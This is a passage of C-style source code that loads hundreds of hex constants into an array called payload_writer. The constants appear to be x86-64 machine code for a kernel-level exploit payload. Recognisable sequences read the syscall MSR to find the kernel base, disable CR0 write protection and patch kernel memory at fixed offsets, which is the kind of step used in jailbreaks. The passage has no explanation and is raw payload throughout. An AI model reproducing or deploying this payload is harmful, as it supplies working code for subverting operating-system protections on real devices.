  payload_writer[325] = 0xC0EC8148;
  payload_writer[326] = 0x49000001;
  payload_writer[327] = 0x848BFD89;
  payload_writer[328] = 0x00021824;
  payload_writer[329] = 0xF3894800;
  payload_writer[330] = 0x24B48B44;
  payload_writer[331] = 0x00000210;
  payload_writer[332] = 0x50D58948;
  payload_writer[333] = 0x848B5641;
  payload_writer[334] = 0x00021824;
  payload_writer[335] = 0xB4FF5000;
  payload_writer[336] = 0x00021824;
  payload_writer[337] = 0x24B4FF00;
  payload_writer[338] = 0x00000218;
  payload_writer[339] = 0x1B1215FF;
  payload_writer[340] = 0x83480000;
  payload_writer[341] = 0xC08530C4;
  payload_writer[342] = 0x0FC48941;
  payload_writer[343] = 0x0002E584;
  payload_writer[344] = 0xF6854500;
  payload_writer[345] = 0x02DC850F;
  payload_writer[346] = 0x8D4C0000;
  payload_writer[347] = 0x31202444;
  payload_writer[348] = 0xC7894CF6;
  payload_writer[349] = 0x2444894C;
  payload_writer[350] = 0x0010BA08;
  payload_writer[351] = 0x8D4C0000;
  payload_writer[352] = 0xFF30247C;
  payload_writer[353] = 0x001BA315;
  payload_writer[354] = 0x748D4C00;
  payload_writer[355] = 0x89485024;
  payload_writer[356] = 0x4820246C;
  payload_writer[357] = 0x282444C7;
  payload_writer[358] = 0x00000100;
  payload_writer[359] = 0x894CF631;
  payload_writer[360] = 0x0010BAFF;
  payload_writer[361] = 0x15FF0000;
  payload_writer[362] = 0x00001B80;
  payload_writer[363] = 0x244C8D4C;
  payload_writer[364] = 0x74894C70;
  payload_writer[365] = 0xC7483024;
  payload_writer[366] = 0x20382444;
  payload_writer[367] = 0xBA000000;
  payload_writer[368] = 0x00000048;
  payload_writer[369] = 0x240C894C;
  payload_writer[370] = 0x894CF631;
  payload_writer[371] = 0x5915FFCF;
  payload_writer[372] = 0x4800001B;
  payload_writer[373] = 0x1772058D;
  payload_writer[374] = 0x89480000;
  payload_writer[375] = 0x00902484;
  payload_writer[376] = 0x8D480000;
  payload_writer[377] = 0x0016E305;
  payload_writer[378] = 0x84894800;
  payload_writer[379] = 0x00009824;
  payload_writer[380] = 0x058D4800;
  payload_writer[381] = 0x00001654;
  payload_writer[382] = 0x24848948;
  payload_writer[383] = 0x000000A0;
  payload_writer[384] = 0xC5058D48;
  payload_writer[385] = 0x48000015;
  payload_writer[386] = 0xA8248489;
  payload_writer[387] = 0x48000000;
  payload_writer[388] = 0x1536058D;
  payload_writer[389] = 0x89480000;
  payload_writer[390] = 0x00B02484;
  payload_writer[391] = 0x48650000;
  payload_writer[392] = 0x00252C8B;
  payload_writer[393] = 0x48000000;
  payload_writer[394] = 0x1A96358B;
  payload_writer[395] = 0xD2310000;
  payload_writer[396] = 0xFFEF8948;
  payload_writer[397] = 0x001B0B15;
  payload_writer[398] = 0x0C8B4C00;
  payload_writer[399] = 0xFF894C24;
  payload_writer[400] = 0x24448B4C;
  payload_writer[401] = 0xCA894C08;
  payload_writer[402] = 0xFFC6894C;
  payload_writer[403] = 0x001A3B15;
  payload_writer[404] = 0x358B4800;
  payload_writer[405] = 0x00001A6C;
  payload_writer[406] = 0x41EF8948;
  payload_writer[407] = 0x15FFC789;
  payload_writer[408] = 0x00001AD8;
  payload_writer[409] = 0x0FFF8545;
  payload_writer[410] = 0x0001D985;
  payload_writer[411] = 0x3D8B4800;
  payload_writer[412] = 0x00001A78;
  payload_writer[413] = 0xD231C931;
  payload_writer[414] = 0x8D4CF631;
  payload_writer[415] = 0xFF40247C;
  payload_writer[416] = 0x001AE715;
  payload_writer[417] = 0x848D4800;
  payload_writer[418] = 0x0000B824;
  payload_writer[419] = 0xBAF63100;
  payload_writer[420] = 0x0000007C;
  payload_writer[421] = 0x48C78948;
  payload_writer[422] = 0x08244489;
  payload_writer[423] = 0x1A8A15FF;
  payload_writer[424] = 0x8B480000;
  payload_writer[425] = 0x01F02484;
  payload_writer[426] = 0x8D4C0000;
  payload_writer[427] = 0x00BC2494;
  payload_writer[428] = 0x894C0000;
  payload_writer[429] = 0x0001BAD1;
  payload_writer[430] = 0x894C0000;
  payload_writer[431] = 0x54894CF7;
  payload_writer[432] = 0x05481024;
  payload_writer[433] = 0x00000370;
  payload_writer[434] = 0xB82484C7;
  payload_writer[435] = 0x37000000;
  payload_writer[436] = 0x48002013;
  payload_writer[437] = 0x8948C689;
  payload_writer[438] = 0x92E82404;
  payload_writer[439] = 0x48FFFFFD;
  payload_writer[440] = 0x19DE358B;
  payload_writer[441] = 0xD2310000;
  payload_writer[442] = 0xFFEF8948;
  payload_writer[443] = 0x001A5315;
  payload_writer[444] = 0xBAF63100;
  payload_writer[445] = 0x00000010;
  payload_writer[446] = 0xFFFF894C;
  payload_writer[447] = 0x001A2B15;
  payload_writer[448] = 0x548B4C00;
  payload_writer[449] = 0x20BA1024;
  payload_writer[450] = 0x4D000000;
  payload_writer[451] = 0xB841F989;
  payload_writer[452] = 0x00000080;
  payload_writer[453] = 0x110D8D48;
  payload_writer[454] = 0x4C000014;
  payload_writer[455] = 0x894CD689;
  payload_writer[456] = 0x5515FFD7;
  payload_writer[457] = 0x48000019;
  payload_writer[458] = 0x1996358B;
  payload_writer[459] = 0x89480000;
  payload_writer[460] = 0x244489EF;
  payload_writer[461] = 0x0115FF10;
  payload_writer[462] = 0x8B00001A;
  payload_writer[463] = 0x85102454;
  payload_writer[464] = 0xE0850FD2;
  payload_writer[465] = 0x48000000;
  payload_writer[466] = 0x3424848D;
  payload_writer[467] = 0x31000001;
  payload_writer[468] = 0x007CBAF6;
  payload_writer[469] = 0x89480000;
  payload_writer[470] = 0x448948C7;
  payload_writer[471] = 0x15FF1024;
  payload_writer[472] = 0x000019C8;
  payload_writer[473] = 0x24348B48;
  payload_writer[474] = 0x24948D4C;
  payload_writer[475] = 0x00000138;
  payload_writer[476] = 0x4CD1894C;
  payload_writer[477] = 0x02BAF789;
  payload_writer[478] = 0x4C000000;
  payload_writer[479] = 0x18245489;
  payload_writer[480] = 0x342484C7;
  payload_writer[481] = 0x37000001;
  payload_writer[482] = 0xE8002013;
  payload_writer[483] = 0xFFFFFCE1;
  payload_writer[484] = 0x2D358B48;
  payload_writer[485] = 0x31000019;
  payload_writer[486] = 0xEF8948D2;
  payload_writer[487] = 0x19A215FF;
  payload_writer[488] = 0xF6310000;
  payload_writer[489] = 0x000010BA;
  payload_writer[490] = 0xFF894C00;
  payload_writer[491] = 0x197A15FF;
  payload_writer[492] = 0x8B4C0000;
  payload_writer[493] = 0x4D182454;
  payload_writer[494] = 0xB841F989;
  payload_writer[495] = 0x00000080;
  payload_writer[496] = 0x650D8D48;
  payload_writer[497] = 0xBA000013;
  payload_writer[498] = 0x00000020;
  payload_writer[499] = 0x4CD6894C;
  payload_writer[500] = 0x15FFD789;
  payload_writer[501] = 0x000018A4;
  payload_writer[502] = 0xE5358B48;
  payload_writer[503] = 0x48000018;
  payload_writer[504] = 0x8941EF89;
  payload_writer[505] = 0x5115FFC6;
  payload_writer[506] = 0x45000019;
  payload_writer[507] = 0x3775F685;
  payload_writer[508] = 0x247C8B48;
  payload_writer[509] = 0xEE894C08;
  payload_writer[510] = 0x185615FF;
  payload_writer[511] = 0xC0850000;
  payload_writer[512] = 0x8B410674;
  payload_writer[513] = 0x14EB007D;
  payload_writer[514] = 0x247C8B48;
  payload_writer[515] = 0xDE894810;
  payload_writer[516] = 0x183E15FF;
  payload_writer[517] = 0xC0850000;
  payload_writer[518] = 0x3B8B1C74;
  payload_writer[519] = 0x74FFFF83;
  payload_writer[520] = 0x2515FF06;
  payload_writer[521] = 0x48000018;
  payload_writer[522] = 0x18BE3D8B;
  payload_writer[523] = 0x15FF0000;
  payload_writer[524] = 0x00001930;
  payload_writer[525] = 0x8B4810EB;
  payload_writer[526] = 0x0018AF3D;
  payload_writer[527] = 0xE4314500;
  payload_writer[528] = 0x191E15FF;
  payload_writer[529] = 0x81480000;
  payload_writer[530] = 0x0001B8C4;
  payload_writer[531] = 0xE0894400;
  payload_writer[532] = 0x5C415D5B;
  payload_writer[533] = 0x5E415D41;
  payload_writer[534] = 0x31C35F41;
  payload_writer[535] = 0xFF8548C0;
  payload_writer[536] = 0x8B481574;
  payload_writer[537] = 0x00188B05;
  payload_writer[538] = 0x008B4800;
  payload_writer[539] = 0x74C08548;
  payload_writer[540] = 0x78394806;
  payload_writer[541] = 0xC3F27520;
  payload_writer[542] = 0x53555441;
  payload_writer[543] = 0x18EA15FF;
  payload_writer[544] = 0x89410000;
  payload_writer[545] = 0x058B48C4;
  payload_writer[546] = 0x00001858;
  payload_writer[547] = 0x48288B48;
  payload_writer[548] = 0x7F74ED85;
  payload_writer[549] = 0x8308458B;
  payload_writer[550] = 0x3774FFF8;
  payload_writer[551] = 0x39158B48;
  payload_writer[552] = 0x48000018;
  payload_writer[553] = 0x85481A8B;
  payload_writer[554] = 0x3B2874DB;
  payload_writer[555] = 0x48097603;
  payload_writer[556] = 0x00909B8B;
  payload_writer[557] = 0xEEEB0000;
  payload_writer[558] = 0x8B480973;
  payload_writer[559] = 0x0000889B;
  payload_writer[560] = 0x75E3EB00;
  payload_writer[561] = 0x047B83E1;
  payload_writer[562] = 0x66087400;
  payload_writer[563] = 0x37087B81;
  payload_writer[564] = 0x48067413;
  payload_writer[565] = 0xEB106D8B;
  payload_writer[566] = 0x7B8366B6;
  payload_writer[567] = 0xF375200A;
  payload_writer[568] = 0xED3D8B48;
  payload_writer[569] = 0x48000017;
  payload_writer[570] = 0xBA0C738D;
  payload_writer[571] = 0x00000020;
  payload_writer[572] = 0x183E15FF;
  payload_writer[573] = 0x8B480000;
  payload_writer[574] = 0x0017CF05;
  payload_writer[575] = 0x53B70F00;
  payload_writer[576] = 0x73B70F08;
  payload_writer[577] = 0x004D8B0A;
  payload_writer[578] = 0xFF388B48;
  payload_writer[579] = 0x00174B15;
  payload_writer[580] = 0x5BC0EB00;
  payload_writer[581] = 0x5DE08944;
  payload_writer[582] = 0x41C35C41;
  payload_writer[583] = 0x83485554;
  payload_writer[584] = 0x894818EC;
  payload_writer[585] = 0x6508247C;
  payload_writer[586] = 0x252C8B48;
  payload_writer[588] = 0x8D358B48;
  payload_writer[589] = 0x31000017;
  payload_writer[590] = 0xEF8948D2;
  payload_writer[591] = 0x180215FF;
  payload_writer[592] = 0x8B4C0000;
  payload_writer[593] = 0x4108244C;
  payload_writer[594] = 0x000080B8;
  payload_writer[595] = 0x0D8D4800;
  payload_writer[596] = 0x000011E8;
  payload_writer[597] = 0x000090BA;
  payload_writer[598] = 0x25BC4100;
  payload_writer[599] = 0x49800F0A;
  payload_writer[600] = 0x4810798D;
  payload_writer[601] = 0x15FFFE89;
  payload_writer[602] = 0x00001708;
  payload_writer[603] = 0x0375C085;
  payload_writer[604] = 0x48C48941;
  payload_writer[605] = 0x174A358B;
  payload_writer[606] = 0x89480000;
  payload_writer[607] = 0xB915FFEF;
  payload_writer[608] = 0x48000017;
  payload_writer[609] = 0x4418C483;
  payload_writer[610] = 0x415DE089;
  payload_writer[611] = 0x5541C35C;
  payload_writer[612] = 0x48555441;
  payload_writer[613] = 0x5153FD89;
  payload_writer[614] = 0x087F8B48;
  payload_writer[615] = 0xB8E8DB31;
  payload_writer[616] = 0x48FFFFFE;
  payload_writer[617] = 0x0474C085;
  payload_writer[618] = 0x10588B48;
  payload_writer[619] = 0xFFEF8948;
  payload_writer[620] = 0x00168F15;
  payload_writer[621] = 0x41C08500;
  payload_writer[622] = 0x0675C489;
  payload_writer[623] = 0x00047D83;
  payload_writer[624] = 0x85484E74;
  payload_writer[625] = 0x664974DB;
  payload_writer[626] = 0x02507B83;
  payload_writer[627] = 0x8D4C4275;
  payload_writer[628] = 0x000260AB;
  payload_writer[629] = 0xEF894C00;
  payload_writer[630] = 0xFFFF3EE8;
  payload_writer[631] = 0x75C085FF;
  payload_writer[632] = 0x00A0BA2F;
  payload_writer[633] = 0x894C0000;
  payload_writer[634] = 0xDF8948EE;
  payload_writer[635] = 0xFFE43145;
  payload_writer[636] = 0x00173F15;
  payload_writer[637] = 0xBB8D4800;
  payload_writer[638] = 0x000000A0;
  payload_writer[639] = 0x000360BA;
  payload_writer[640] = 0xFFF63100;
  payload_writer[641] = 0x00172315;
  payload_writer[642] = 0x0445C700;
  payload_writer[644] = 0xE089445A;
  payload_writer[645] = 0x5C415D5B;
  payload_writer[646] = 0x55C35D41;
  payload_writer[647] = 0xFB894853;
  payload_writer[648] = 0x7F8B4851;
  payload_writer[649] = 0xE8ED3108;
  payload_writer[650] = 0xFFFFFE2F;
  payload_writer[651] = 0x74C08548;
  payload_writer[652] = 0x688B4804;
  payload_writer[653] = 0xDF894810;
  payload_writer[654] = 0x160615FF;
  payload_writer[655] = 0xC0850000;
  payload_writer[656] = 0x7B830675;
  payload_writer[657] = 0x1C740004;
  payload_writer[658] = 0x74ED8548;
  payload_writer[659] = 0x007D8117;
  payload_writer[660] = 0x00000200;
  payload_writer[661] = 0x8D480E75;
  payload_writer[662] = 0xBCE8247D;
  payload_writer[663] = 0x89FFFFFE;
  payload_writer[664] = 0xC0310443;
  payload_writer[665] = 0xC35D5B5A;
  payload_writer[666] = 0x000082B9;
  payload_writer[667] = 0x48320FC0;
  payload_writer[668] = 0x4820E2C1;
  payload_writer[669] = 0x200FD009;
  payload_writer[670] = 0xF28948C6;
  payload_writer[671] = 0xFFE28148;
  payload_writer[672] = 0x0FFFFEFF;
  payload_writer[673] = 0x5F9CC222;
  payload_writer[674] = 0x158D48FA;
  payload_writer[675] = 0xFFFFFF8B;
  payload_writer[676] = 0x40888D48;
  payload_writer[677] = 0x81FFFFFE;
  payload_writer[678] = 0x668A55EA;
  payload_writer[679] = 0x89CA2900;
  payload_writer[680] = 0x66889190;
  payload_writer[681] = 0x158D4800;
  payload_writer[682] = 0xFFFFFEE2;
  payload_writer[683] = 0x9863EA81;
  payload_writer[684] = 0xCA290066;
  payload_writer[685] = 0x969F9089;
  payload_writer[686] = 0x8D480066;
  payload_writer[687] = 0xFFF95B15;
  payload_writer[688] = 0xDAEA81FF;
  payload_writer[689] = 0x290063E2;
  payload_writer[690] = 0x169089CA;
  payload_writer[691] = 0x480063E1;
  payload_writer[692] = 0xFDA2158D;
  payload_writer[693] = 0xEA81FFFF;
  payload_writer[694] = 0x006498A2;
  payload_writer[695] = 0x9089CA29;
  payload_writer[696] = 0x006496DE;
  payload_writer[697] = 0x1F158D48;
  payload_writer[698] = 0x44FFFFFA;
  payload_writer[699] = 0xACB0828D;
  payload_writer[700] = 0xEA81FF94;
  payload_writer[701] = 0x006B5581;
  payload_writer[702] = 0x29C82941;
  payload_writer[703] = 0x808944CA;
  payload_writer[704] = 0x006B518C;
  payload_writer[705] = 0x53BD9089;
  payload_writer[706] = 0x9D57006B;
  payload_writer[707] = 0xC3C6220F;
  payload_writer[708] = 0x74FF8548;
  payload_writer[709] = 0x023F8331;
  payload_writer[710] = 0x83482C75;
  payload_writer[711] = 0x8D4818EC;
  payload_writer[712] = 0xFF082474;
  payload_writer[713] = 0x00157B15;
  payload_writer[714] = 0x74C08500;
  payload_writer[715] = 0xEBC03104;
  payload_writer[716] = 0x448B4810;
  payload_writer[717] = 0x83480824;
  payload_writer[718] = 0x0F010878;
  payload_writer[719] = 0xB60FC094;
  payload_writer[720] = 0xC48348C0;
  payload_writer[721] = 0xC031C318;
  payload_writer[722] = 0x415541C3;
  payload_writer[723] = 0x89495554;
  payload_writer[724] = 0xEC8148CD;
  payload_writer[725] = 0x000000A0;
  payload_writer[726] = 0x48013F83;
  payload_writer[727] = 0x0C75FD89;
  payload_writer[728] = 0x74F68548;
  payload_writer[729] = 0xED854D44;
  payload_writer[730] = 0x3DEB3375;
  payload_writer[731] = 0x24348948;
  payload_writer[732] = 0x0C245489;
  payload_writer[733] = 0xFFFF97E8;
  payload_writer[734] = 0x348B48FF;
  payload_writer[735] = 0x75C08524;
  payload_writer[736] = 0x24548BDF;
  payload_writer[737] = 0xC481480C;
  payload_writer[738] = 0x000000A0;
  payload_writer[739] = 0x48E9894C;
  payload_writer[740] = 0x415DEF89;
  payload_writer[741] = 0xFF5D415C;
  payload_writer[742] = 0x00150F25;
  payload_writer[743] = 0xEF894800;
  payload_writer[744] = 0xFFFF6BE8;
  payload_writer[745] = 0x75C085FF;
  payload_writer[746] = 0x16BC410B;
  payload_writer[747] = 0xE9000000;
  payload_writer[748] = 0x0000011D;
  payload_writer[749] = 0x24748D48;
  payload_writer[750] = 0xEF894810;
  payload_writer[751] = 0x14E215FF;
  payload_writer[752] = 0xC0850000;
  payload_writer[753] = 0x0FC48941;
  payload_writer[754] = 0x00010485;
  payload_writer[755] = 0x00458B00;
  payload_writer[756] = 0x7501F883;
  payload_writer[757] = 0x458B480F;
  payload_writer[758] = 0xC0854838;
  payload_writer[759] = 0x00D1840F;
  payload_writer[760] = 0x66EB0000;
  payload_writer[761] = 0x0F02F883;
  payload_writer[762] = 0x0000CE85;
  payload_writer[763] = 0x458B4800;
  payload_writer[764] = 0x70B70F38;
  payload_writer[765] = 0x50B70F0C;
  payload_writer[766] = 0x4E8D4818;
  payload_writer[767] = 0xE2C148E0;
  payload_writer[768] = 0xD1294805;
  payload_writer[769] = 0x3FF98348;
  payload_writer[770] = 0x00B5860F;
  payload_writer[771] = 0xE1800000;
  payload_writer[772] = 0xAC850F0F;
  payload_writer[773] = 0x0F000000;
  payload_writer[774] = 0x480E48B7;
  payload_writer[775] = 0x000EB48D;
  payload_writer[776] = 0x48FFFFFF;
  payload_writer[777] = 0x8D48C601;
  payload_writer[778] = 0x48201044;
  payload_writer[779] = 0x00883E81;
  payload_writer[780] = 0x16750000;
  payload_writer[781] = 0x08C68348;
  payload_writer[782] = 0x247C8D48;
  payload_writer[783] = 0x0088BA18;
  payload_writer[784] = 0x15FF0000;
  payload_writer[785] = 0x000014EC;
  payload_writer[786] = 0x408B54EB;
  payload_writer[787] = 0x183D6610;
  payload_writer[788] = 0x772774FE;
  payload_writer[789] = 0x83C28976;
  payload_writer[790] = 0x8166EFE2;
  payload_writer[791] = 0x74FE00FA;
  payload_writer[792] = 0xF8836606;
  payload_writer[793] = 0x48647502;
  payload_writer[794] = 0x18247C8D;
  payload_writer[795] = 0x000088BA;
  payload_writer[796] = 0x358D4800;
  payload_writer[797] = 0x00001214;
  payload_writer[798] = 0x8D4811EB;
  payload_writer[799] = 0xBA18247C;
  payload_writer[800] = 0x00000088;
  payload_writer[801] = 0x61358D48;
  payload_writer[802] = 0xFF000011;
  payload_writer[803] = 0x0014A315;
  payload_writer[804] = 0x448B4800;
  payload_writer[805] = 0x8B481024;
  payload_writer[806] = 0x44894800;
  payload_writer[807] = 0x8D481824;
  payload_writer[808] = 0xBA182474;
  payload_writer[809] = 0x00000088;
  payload_writer[810] = 0xFFEF894C;
  payload_writer[811] = 0x00148315;
  payload_writer[812] = 0x411EEB00;
  payload_writer[813] = 0x000003BC;
  payload_writer[814] = 0x4116EB00;
  payload_writer[815] = 0xFFFFDDBC;
  payload_writer[816] = 0x410EEBFF;
  payload_writer[817] = 0xFFFFDBBC;
  payload_writer[818] = 0x4106EBFF;
  payload_writer[819] = 0x00002DBC;
  payload_writer[820] = 0xC4814800;
  payload_writer[821] = 0x000000A0;
  payload_writer[822] = 0x5DE08944;
  payload_writer[823] = 0x5D415C41;
  payload_writer[824] = 0x415741C3;
  payload_writer[825] = 0x41554156;
  payload_writer[826] = 0x48535554;
  payload_writer[827] = 0x4828EC83;
  payload_writer[828] = 0x8D48FD89;
  payload_writer[829] = 0xFF18247C;
  payload_writer[830] = 0x00139F15;
  payload_writer[831] = 0x007D8300;
  payload_writer[832] = 0xB2850F01;
  payload_writer[833] = 0x8B000000;
  payload_writer[834] = 0x02BA0045;
  payload_writer[835] = 0x48000000;
  payload_writer[836] = 0x13EE1D8B;
  payload_writer[837] = 0xBC410000;
  payload_writer[838] = 0x0000000C;
  payload_writer[839] = 0xE9358B48;
  payload_writer[840] = 0x89000013;
  payload_writer[841] = 0x8B082444;
  payload_writer[842] = 0x0F440845;
  payload_writer[843] = 0x890C7BB7;
  payload_writer[844] = 0x0F0C2444;
  payload_writer[845] = 0x410E43B7;
  payload_writer[846] = 0x634DC701;
  payload_writer[847] = 0xEF894CEF;
  payload_writer[848] = 0x141615FF;
  payload_writer[849] = 0x85480000;
  payload_writer[850] = 0xC68949C0;
  payload_writer[851] = 0x0083840F;
  payload_writer[852] = 0x8B480000;
  payload_writer[853] = 0x894C3875;
  payload_writer[854] = 0xC78948EA;
  payload_writer[855] = 0x13D215FF;
  payload_writer[856] = 0x8B480000;
  payload_writer[857] = 0x894C387D;
  payload_writer[858] = 0xDE8948EA;
  payload_writer[859] = 0x13C215FF;
  payload_writer[860] = 0x45C70000;
  payload_writer[861] = 0x00000200;
  payload_writer[862] = 0xEF894800;
  payload_writer[863] = 0x087D8944;
  payload_writer[864] = 0x130E15FF;
  payload_writer[865] = 0x8B480000;
  payload_writer[866] = 0x894C387D;
  payload_writer[867] = 0xC48941F6;
  payload_writer[868] = 0xFFEA894C;
  payload_writer[869] = 0x00139B15;
  payload_writer[870] = 0x24448B00;
  payload_writer[871] = 0xF7894C08;
  payload_writer[872] = 0x65358B48;
  payload_writer[873] = 0x89000013;
  payload_writer[874] = 0x448B0045;
  payload_writer[875] = 0x45890C24;
  payload_writer[876] = 0x9D15FF08;
  payload_writer[877] = 0xEB000013;
  payload_writer[878] = 0xEF89481C;
  payload_writer[879] = 0xFFFD4FE8;
  payload_writer[880] = 0x0FC085FF;
  payload_writer[881] = 0xFFFF3E85;
  payload_writer[882] = 0xEF8948FF;
  payload_writer[883] = 0x12C215FF;
  payload_writer[884] = 0x89410000;
  payload_writer[885] = 0xC48348C4;
  payload_writer[886] = 0xE0894428;
  payload_writer[887] = 0x5C415D5B;
  payload_writer[888] = 0x5E415D41;
  payload_writer[889] = 0x48C35F41;
  payload_writer[890] = 0x3A74FF85;
  payload_writer[891] = 0x358D4853;
  payload_writer[892] = 0x00000FD8;
  payload_writer[893] = 0x10EC8348;
  payload_writer[894] = 0x247C8948;
  payload_writer[895] = 0x4915FF08;
  payload_writer[896] = 0x48000013;
  payload_writer[897] = 0x08247C8B;
  payload_writer[898] = 0x48C08548;
  payload_writer[899] = 0x1174C389;
  payload_writer[900] = 0xB53D8D48;
  payload_writer[901] = 0xFF00000F;
  payload_writer[902] = 0x00130715;
  payload_writer[903] = 0x3C8D4800;
  payload_writer[904] = 0xC4834803;
  payload_writer[905] = 0x25FF5B10;
  payload_writer[906] = 0x00001290;
  payload_writer[907] = 0xE5894855;
  payload_writer[908] = 0x83485541;
  payload_writer[909] = 0x8B4818EC;
  payload_writer[910] = 0x89490045;
  payload_writer[911] = 0x788B48FD;
  payload_writer[912] = 0xFF8548F8;
  payload_writer[913] = 0x89481974;
  payload_writer[914] = 0x8948E055;
  payload_writer[915] = 0xBDE8E875;
  payload_writer[916] = 0x48FFFFFC;
  payload_writer[917] = 0x85E8758B;
  payload_writer[918] = 0x558B48C0;
  payload_writer[919] = 0x481075E0;
  payload_writer[920] = 0x4C18C483;
  payload_writer[921] = 0x5D41EF89;
  payload_writer[922] = 0x4525FF5D;
  payload_writer[923] = 0xC7000012;
  payload_writer[924] = 0x00000442;
  payload_writer[925] = 0x83480000;
  payload_writer[926] = 0x5D4118C4;
  payload_writer[927] = 0xC35DC031;
  payload_writer[928] = 0x48FF8548;
  payload_writer[929] = 0x126A158B;
  payload_writer[930] = 0x89480000;
  payload_writer[931] = 0x481774F8;
  payload_writer[932] = 0x8548128B;
  payload_writer[933] = 0x480C74D2;
  payload_writer[934] = 0x7520423B;
  payload_writer[935] = 0x428B48F2;
  payload_writer[936] = 0x3103EB10;
  payload_writer[937] = 0x55C3C3C0;
  payload_writer[938] = 0x41E58948;
  payload_writer[939] = 0x41564157;
  payload_writer[940] = 0x53544155;
  payload_writer[941] = 0x28EC8348;
  payload_writer[942] = 0x00458B48;
  payload_writer[943] = 0x49FD8949;
  payload_writer[944] = 0x8B48F489;
  payload_writer[945] = 0x8548F878;
  payload_writer[946] = 0x8B5E74FF;
  payload_writer[947] = 0x3F834846;
  payload_writer[948] = 0x468B4C01;
  payload_writer[949] = 0x7E8B4C08;
  payload_writer[950] = 0x768B4C50;
  payload_writer[951] = 0xCC458958;
  payload_writer[952] = 0x75445E8B;
  payload_writer[953] = 0xC7894C2B;
  payload_writer[954] = 0xFFFF93E8;
  payload_writer[955] = 0xFF894CFF;
  payload_writer[956] = 0x49C03145;
  payload_writer[957] = 0x85E8C589;
  payload_writer[958] = 0x4DFFFFFF;
  payload_writer[959] = 0x8948F685;
  payload_writer[960] = 0x4C4074C6;
  payload_writer[961] = 0x75E8F789;
  payload_writer[962] = 0x49FFFFFF;
  payload_writer[963] = 0x33EBC089;
  payload_writer[964] = 0xB8558948;
  payload_writer[965] = 0xC045894C;
  payload_writer[966] = 0xFFFBF3E8;
  payload_writer[967] = 0x458B4CFF;
  payload_writer[968] = 0x48C085C0;
  payload_writer[969] = 0x75B8558B;
  payload_writer[970] = 0xC48348BC;
  payload_writer[971] = 0xE6894C28;
  payload_writer[972] = 0xEF894C5B;
  payload_writer[973] = 0x5D415C41;
  payload_writer[974] = 0x5F415E41;
  payload_writer[975] = 0x7125FF5D;
  payload_writer[976] = 0x4D000011;
  payload_writer[977] = 0x894CED85;
  payload_writer[978] = 0x6274C045;
  payload_writer[979] = 0x74F68548;
  payload_writer[980] = 0x48D8895D;
  payload_writer[981] = 0x11DA0D8B;
  payload_writer[982] = 0x01480000;
  payload_writer[983] = 0xF6854DC6;
  payload_writer[984] = 0x4DC0950F;
  payload_writer[985] = 0x950FF739;
  payload_writer[986] = 0xA8D021C2;
  payload_writer[987] = 0x85377401;
  payload_writer[988] = 0x413374DB;
  payload_writer[989] = 0x004000BE;
  payload_writer[990] = 0xEF894C00;
  payload_writer[991] = 0x4CDE2941;
  payload_writer[992] = 0xD1FFF289;
  payload_writer[993] = 0xC0458B4C;
  payload_writer[994] = 0x74C0854D;
  payload_writer[995] = 0xCC458B21;
  payload_writer[996] = 0x2E3C8D4B;
  payload_writer[997] = 0x8DC6894C;
  payload_writer[998] = 0xC0000394;
  payload_writer[999] = 0x15FFFFFF;
  payload_writer[1000] = 0x00001190;
  payload_writer[1001] = 0x558B08EB;
  payload_writer[1002] = 0xEF894CCC;
  payload_writer[1003] = 0xC741D1FF;
  payload_writer[1004] = 0x00042444;
  payload_writer[1005] = 0x48000000;
  payload_writer[1006] = 0x5B28C483;
  payload_writer[1007] = 0x5C41C031;
  payload_writer[1008] = 0x5E415D41;
  payload_writer[1009] = 0xC35D5F41;
  payload_writer[1010] = 0x000082B9;
  payload_writer[1011] = 0x48320FC0;
  payload_writer[1012] = 0x4820E2C1;
  payload_writer[1013] = 0x200FD009;
  payload_writer[1014] = 0xF28948C6;
  payload_writer[1015] = 0xFFE28148;
  payload_writer[1016] = 0x0FFFFEFF;
  payload_writer[1017] = 0x5F9CC222;
  payload_writer[1018] = 0x0D8D48FA;
  payload_writer[1019] = 0xFFFFFB59;
  payload_writer[1020] = 0x40908D48;
  payload_writer[1021] = 0x81FFFFFE;
  payload_writer[1022] = 0x65EAD4E9;
  payload_writer[1023] = 0x89D12900;
  payload_writer[1024] = 0x65E91088;
  payload_writer[1025] = 0x0D8D4800;
  payload_writer[1026] = 0xFFFFFCD5;
  payload_writer[1027] = 0xA5818D44;
  payload_writer[1028] = 0x81FF9A0D;
  payload_writer[1029] = 0x65FEFDE9;
  payload_writer[1030] = 0x41D12900;
  payload_writer[1031] = 0x8889D029;
  payload_writer[1032] = 0x0065FD39;
  payload_writer[1033] = 0x010D8D48;
  payload_writer[1034] = 0x81FFFFFE;
  payload_writer[1035] = 0x65CA12E9;
  payload_writer[1036] = 0x80894400;
  payload_writer[1037] = 0x0065F097;
  payload_writer[1038] = 0x8889D129;
  payload_writer[1039] = 0x0065C84E;
  payload_writer[1040] = 0x600D8D48;
  payload_writer[1041] = 0x81FFFFFE;
  payload_writer[1042] = 0x65D66EE9;
  payload_writer[1043] = 0x89D12900;
  payload_writer[1044] = 0x65D4AA88;
  payload_writer[1045] = 0x0D8D4800;
  payload_writer[1046] = 0xFFFFFD8B;
  payload_writer[1047] = 0xE981E981;
  payload_writer[1048] = 0xD1290065;
  payload_writer[1049] = 0xE7BD8889;
  payload_writer[1050] = 0x9D570065;
  payload_writer[1051] = 0xC3C6220F;
  payload_writer[1052] = 0x000082B9;
  payload_writer[1053] = 0x48320FC0;
  payload_writer[1054] = 0x4820E2C1;
  payload_writer[1055] = 0x8D48D009;
  payload_writer[1056] = 0xA7AC9090;
  payload_writer[1057] = 0x15894801;
  payload_writer[1058] = 0x00001080;
  payload_writer[1059] = 0x18908D48;
  payload_writer[1060] = 0x4801555A;
  payload_writer[1061] = 0x106A1589;
  payload_writer[1062] = 0x8D480000;
  payload_writer[1063] = 0xB4815890;
  payload_writer[1064] = 0x15894801;
  payload_writer[1065] = 0x00001054;
  payload_writer[1066] = 0x88908D48;
  payload_writer[1067] = 0x4802669C;
  payload_writer[1068] = 0x103E1589;
  payload_writer[1069] = 0x8D480000;
  payload_writer[1070] = 0x69440090;
  payload_writer[1071] = 0x15894802;
  payload_writer[1072] = 0x00001028;
  payload_writer[1073] = 0x88908D48;
  payload_writer[1074] = 0x48026986;
  payload_writer[1075] = 0x10121589;
  payload_writer[1076] = 0x8D480000;
  payload_writer[1077] = 0x69869890;
  payload_writer[1078] = 0x15894802;
  payload_writer[1079] = 0x00000FFC;
  payload_writer[1080] = 0x40908D48;
  payload_writer[1081] = 0x480269BE;
  payload_writer[1082] = 0x0FE61589;
  payload_writer[1083] = 0x8D480000;
  payload_writer[1084] = 0x69C64890;
